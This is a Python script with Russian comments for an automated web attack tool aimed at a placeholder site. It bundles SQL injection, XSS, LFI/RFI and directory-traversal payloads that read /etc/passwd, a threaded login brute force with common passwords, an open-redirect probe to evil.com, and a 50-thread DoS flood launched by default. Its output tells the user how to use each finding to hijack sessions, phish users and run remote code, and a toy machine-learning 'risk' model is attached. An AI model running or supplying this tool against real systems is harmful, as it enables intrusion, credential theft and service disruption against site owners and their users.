import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import threading
import time
import re
import numpy as np
from sklearn.ensemble import RandomForestClassifier
from sklearn.preprocessing import StandardScaler

# Основной URL сайта
base_url = "http://example.com/"

# Список общих директорий для проверки
common_directories = [
    "admin/",
    "login/",
    "dashboard/",
    "config/",
    "backup/",
    "test/"
]

# Список SQL инъекций
sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1--",
    "' OR 'a'='a",
    "admin' --",
    "' OR '1'='1' #",
    "' OR 1=1#"
]

# Список XSS payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "<body onload=alert(1)>"
]

# Список LFI payloads
lfi_payloads = [
    "etc/passwd",
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd"
]

# Список RFI payloads
rfi_payloads = [
    "http://example.com/malicious.txt",
    "http://test.com/malicious.txt"
]

# Список для брутфорс атаки
common_usernames = [
    "admin",
    "root",
    "user",
    "test",
    "guest"
]
common_passwords = [
    "admin",
    "password",
    "123456",
    "12345678",
    "1234",
    "qwerty",
    "12345",
    "123456789"
]

# Регулярные выражения для поиска уязвимостей в коде
code_patterns = [
    re.compile(r"eval\((.*)\)"),
    re.compile(r"base64_decode\((.*)\)"),
    re.compile(r"shell_exec\((.*)\)"),
    re.compile(r"system\((.*)\)"),
    re.compile(r"passthru\((.*)\)"),
    re.compile(r"popen\((.*)\)"),
    re.compile(r"proc_open\((.*)\)")
]

# Список Directory Traversal payloads
dt_payloads = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd"
]

results = {
    "directories": [],
    "sql_injections": [],
    "xss": [],
    "lfi": [],
    "rfi": [],
    "open_redirects": [],
    "brute_force": [],
    "code_vulnerabilities": [],
    "directory_traversal": [],
    "cookie_issues": [],
    "dos": [],
    "found_accounts": []
}

# Обучающие данные (примерные данные о уязвимостях)
training_data = [
    # [severity, exploitability, impact, mitigation_difficulty, is_exploitable]
    [9, 8, 9, 5, 1],  # SQL Injection
    [7, 7, 6, 4, 1],  # XSS
    [8, 7, 8, 6, 1],  # LFI
    [8, 7, 8, 6, 1],  # RFI
    [5, 4, 4, 3, 1],  # Brute Force
    [9, 9, 9, 7, 1],  # DoS
    [8, 7, 8, 5, 1]  # Directory Traversal
]

X = np.array([x[:-1] for x in training_data])
y = np.array([x[-1] for x in training_data])

# Масштабирование данных
scaler = StandardScaler()
X = scaler.fit_transform(X)

# Создание и обучение модели
model = RandomForestClassifier(random_state=42)
model.fit(X, y)


# Функция для предсказания уязвимостей
def predict_vulnerability(severity, exploitability, impact, mitigation_difficulty):
    data = np.array([[severity, exploitability, impact, mitigation_difficulty]])
    data_scaled = scaler.transform(data)
    prediction = model.predict(data_scaled)
    return prediction[0]


# Функция проверки директорий
def check_directories(base_url, directories):
    print("[*] Проверка общих директорий...")
    for directory in directories:
        url = urljoin(base_url, directory)
        response = requests.get(url)
        if response.status_code == 200:
            print(f"[+] Директория найдена: {url}")
            results["directories"].append(url)


# Функция проверки SQL инъекций
def check_sql_injections(base_url, payloads):
    print("[*] Проверка SQL инъекций...")
    for vuln in payloads:
        payload = {"username": vuln, "password": vuln}
        response = requests.post(base_url, data=payload)
        if "Welcome" in response.text or response.status_code == 200:
            print(f"[+] Уязвимость найдена с payload: {vuln}")
            results["sql_injections"].append((base_url, vuln))


# Функция проверки XSS
def check_xss(base_url, payloads):
    print("[*] Проверка XSS...")
    response = requests.get(base_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')

    for form in forms:
        action = form.get('action')
        post_url = urljoin(base_url, action)
        inputs = form.find_all('input')
        form_data = {input.get('name'): payloads[0] for input in inputs if input.get('name')}

        for payload in payloads:
            form_data.update({input.get('name'): payload for input in inputs if input.get('name')})
            response = requests.post(post_url, data=form_data)
            if payload in response.text:
                print(f"[+] XSS уязвимость найдена с payload: {payload} в форме {action}")
                results["xss"].append((post_url, payload))


# Функция проверки LFI (Local File Inclusion)
def check_lfi(base_url, payloads):
    print("[*] Проверка LFI...")
    for payload in payloads:
        url = urljoin(base_url, payload)
        response = requests.get(url)
        if "root:x" in response.text:
            print(f"[+] LFI уязвимость найдена с payload: {url}")
            results["lfi"].append(url)


# Функция проверки RFI (Remote File Inclusion)
def check_rfi(base_url, payloads):
    print("[*] Проверка RFI...")
    for payload in payloads:
        url = f"{base_url}?file={payload}"
        response = requests.get(url)
        if response.status_code == 200 and "malicious" in response.text:
            print(f"[+] RFI уязвимость найдена с payload: {payload}")
            results["rfi"].append((url, payload))


# Функция проверки Open Redirect
def check_open_redirect(base_url):
    print("[*] Проверка Open Redirect...")
    payload = "http://evil.com"
    response = requests.get(f"{base_url}?next={payload}")
    if response.status_code == 200 and "evil.com" in response.url:
        print(f"[+] Open Redirect уязвимость найдена с payload: {payload}")
        results["open_redirects"].append((base_url, payload))


# Функция для брутфорс атаки
def brute_force_login(base_url, usernames, passwords, duration=120):
    print("[*] Проверка на брутфорс...")
    login_url = urljoin(base_url, "login")
    end_time = time.time() + duration
    found_any = False

    def try_login(username, password):
        nonlocal found_any
        payload = {"username": username, "password": password}
        response = requests.post(login_url, data=payload)
        if "Welcome" in response.text or response.status_code == 200:
            print(f"[+] Брутфорс успешен с логином: {username} и паролем: {password}")
            results["found_accounts"].append((username, password))
            found_any = True

    threads = []
    for username in usernames:
        for password in passwords:
            if time.time() > end_time:
                break
            t = threading.Thread(target=try_login, args=(username, password))
            t.start()
            threads.append(t)

    for t in threads:
        t.join()

    if not found_any:
        print("[-] Пароли не найдены за отведенное время.")


# Функция проверки уязвимостей в коде
def check_code_vulnerabilities(base_url):
    print("[*] Проверка кода на уязвимости...")
    response = requests.get(base_url)
    for pattern in code_patterns:
        match = pattern.search(response.text)
        if match:
            print(f"[+] Уязвимость в коде найдена: {pattern.pattern}")
            results["code_vulnerabilities"].append((base_url, pattern.pattern))


# Функция проверки Directory Traversal
def check_directory_traversal(base_url, payloads):
    print("[*] Проверка Directory Traversal...")
    for payload in payloads:
        url = f"{base_url}?file={payload}"
        response = requests.get(url)
        if "root:x" in response.text:
            print(f"[+] Directory Traversal уязвимость найдена: {url}")
            results["directory_traversal"].append(url)


# Функция проверки куки
def check_cookie_issues(base_url):
    print("[*] Проверка установки куки...")
    response = requests.get(base_url)
    if "Set-Cookie" in response.headers:
        print("[+] Найдены проблемы с куками.")
        results["cookie_issues"].append("Set-Cookie found in response headers")


# Функция для стресс-тестирования (DoS)
def dos_attack(url, duration=10):
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            response = requests.get(url)
            if response.status_code == 200:
                results["dos"].append("Successful request")
            else:
                results["dos"].append("Failed request")
        except requests.exceptions.RequestException as e:
            results["dos"].append(f"Request failed: {str(e)}")


# Запуск DoS атаки в отдельном потоке
def start_dos_attack(url, duration=10):
    print("[*] Начало DoS атаки... Пожалуйста, подождите завершения.")
    threads = []
    for _ in range(50):  # Количество потоков
        t = threading.Thread(target=dos_attack, args=(url, duration))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("[*] DoS атака завершена.")


if __name__ == "__main__":
    check_directories(base_url, common_directories)
    check_sql_injections(base_url, sql_payloads)
    check_xss(base_url, xss_payloads)
    check_lfi(base_url, lfi_payloads)
    check_rfi(base_url, rfi_payloads)
    check_open_redirect(base_url)
    brute_force_login(base_url, common_usernames, common_passwords, duration=120)  # Брутфорс длится 2 минуты
    check_code_vulnerabilities(base_url)
    check_directory_traversal(base_url, dt_payloads)
    check_cookie_issues(base_url)

    # Запуск DoS атаки на 10 секунд
    start_dos_attack(base_url, duration=10)

    # Использование модели для анализа результатов
    vulnerabilities_data = []
    for vuln_type, vuln_list in results.items():
        for vuln in vuln_list:
            if vuln_type in ["sql_injections", "xss", "lfi", "rfi", "directory_traversal"]:
                # Примерные данные для модели: [severity, exploitability, impact, mitigation_difficulty]
                if vuln_type == "sql_injections":
                    data = [9, 8, 9, 5]
                elif vuln_type == "xss":
                    data = [7, 7, 6, 4]
                elif vuln_type == "lfi":
                    data = [8, 7, 8, 6]
                elif vuln_type == "rfi":
                    data = [8, 7, 8, 6]
                elif vuln_type == "directory_traversal":
                    data = [8, 7, 8, 5]
                exploitability = predict_vulnerability(*data)
                vulnerabilities_data.append((vuln_type, vuln, exploitability))

    # Вывод результатов
    print("\n[*] Результаты сканирования:")
    vulnerabilities_found = False
    for vuln_type, vuln_list in results.items():
        if vuln_list:
            vulnerabilities_found = True
            print(f"\n{vuln_type.upper()}:")
            for vuln in set(vuln_list):  # Использование set для исключения дубликатов
                if vuln_type == "sql_injections":
                    print(f"- SQL Injection уязвимость на {vuln[0]} с payload: {vuln[1]}")
                elif vuln_type == "xss":
                    print(f"- XSS уязвимость на {vuln[0]} с payload: {vuln[1]}")
                elif vuln_type == "lfi":
                    print(f"- LFI уязвимость на URL: {vuln}")
                elif vuln_type == "rfi":
                    print(f"- RFI уязвимость на {vuln[0]} с payload: {vuln[1]}")
                elif vuln_type == "open_redirects":
                    print(f"- Open Redirect уязвимость на {vuln[0]} с payload: {vuln[1]}")
                elif vuln_type == "brute_force":
                    print(f"- Брутфорс успешен на {vuln[0]} с логином: {vuln[1]} и паролем: {vuln[2]}")
                elif vuln_type == "code_vulnerabilities":
                    print(f"- Уязвимость в коде на {vuln[0]}: {vuln[1]}")
                elif vuln_type == "directory_traversal":
                    print(f"- Directory Traversal уязвимость на URL: {vuln}")
                elif vuln_type == "cookie_issues":
                    print(f"- Найдены проблемы с куками: {vuln}")
                elif vuln_type == "dos":
                    print(f"- DoS атака возможна: {vuln}")

    if vulnerabilities_found:
        print(
            "\nВывод: У сайта есть уязвимости. Вот как их можно использовать:")
        for vuln_type, vuln_list in results.items():
            if vuln_list:
                print(f"\n{vuln_type.upper()}:")
                for vuln in set(vuln_list):
                    if vuln_type == "sql_injections":
                        print(
                            f"- SQL Injection: Воспользуйтесь {vuln[1]} на {vuln[0]} для выполнения SQL-запросов, которые могут обойти аутентификацию или раскрыть данные.")
                    elif vuln_type == "xss":
                        print(
                            f"- XSS: Вставьте {vuln[1]} в {vuln[0]} для выполнения JavaScript-кода в браузерах пользователей, что может привести к краже сессий или установке вредоносного ПО.")
                    elif vuln_type == "lfi":
                        print(
                            f"- LFI: Обратитесь к URL {vuln} для доступа к файлам системы, таким как конфигурационные файлы и данные о пользователях.")
                    elif vuln_type == "rfi":
                        print(
                            f"- RFI: Включите удаленный файл через {vuln[0]} с payload {vuln[1]} для выполнения удаленного кода на сервере.")
                    elif vuln_type == "open_redirects":
                        print(
                            f"- Open Redirect: Перенаправьте пользователей через {vuln[0]} с payload {vuln[1]} на фишинговые сайты для кражи учетных данных.")
                    elif vuln_type == "brute_force":
                        print(
                            f"- Brute Force: Используйте логин {vuln[1]} и пароль {vuln[2]} для входа на {vuln[0]} и получения несанкционированного доступа.")
                    elif vuln_type == "code_vulnerabilities":
                        print(
                            f"- Code Vulnerability: Воспользуйтесь уязвимостью {vuln[1]} на {vuln[0]} для выполнения произвольного кода или раскрытия данных.")
                    elif vuln_type == "directory_traversal":
                        print(
                            f"- Directory Traversal: Обратитесь к URL {vuln} для доступа к файловой системе сервера, что может привести к утечке конфиденциальных данных.")
                    elif vuln_type == "cookie_issues":
                        print(
                            f"- Cookie Issues: Используйте проблемы с куками на сайте {vuln} для проведения атак сессий, таких как фиксация сессий или захват сессий.")
                    elif vuln_type == "dos":
                        print(
                            f"- DoS Attack: Сайт уязвим для DoS атак, что может привести к отказу в обслуживании для законных пользователей.")

        # Вывод рекомендаций на основе модели
        print("\nРекомендации на основе машинного обучения:")
        for vuln_type, vuln, exploitability in vulnerabilities_data:
            print(
                f"- {vuln_type.upper()}: уязвимость на {vuln}. Риск эксплуатации: {'Высокий' if exploitability else 'Низкий'}")
    else:
        print("\nВывод: У сайта не обнаружено уязвимостей.")

    # Вывод найденных аккаунтов
    if results["found_accounts"]:
        print("\nНайденные аккаунты:")
        for idx, account in enumerate(results["found_accounts"], start=1):
            print(f"{idx}. {account[0]} - {account[1]}")
    else:
        print("\nПароли не найдены за отведенное время.")
